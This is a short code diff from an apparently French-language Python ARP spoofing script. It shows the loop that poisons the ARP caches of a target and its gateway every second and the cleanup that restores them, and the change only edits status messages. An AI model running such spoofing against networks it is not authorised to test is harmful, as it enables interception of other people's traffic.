@@ -24,12 +24,10 @@ try:
     while packets >= 0:
         spoof(Ip_cible,Mac_cible,Ip_passerelle)
         spoof(Ip_passerelle,Mac_passerelle,Ip_cible)
-
         time.sleep(1)
         
 except KeyboardInterrupt:
-    print("\n[+] Restoring ARP tables...")
     restore(Ip_cible, Ip_passerelle, Mac_passerelle)
     restore(Ip_passerelle, Ip_cible, Mac_cible)
-    print("[+] ARP tables restored.")
+    print(" Tables ARP restoré.")
 
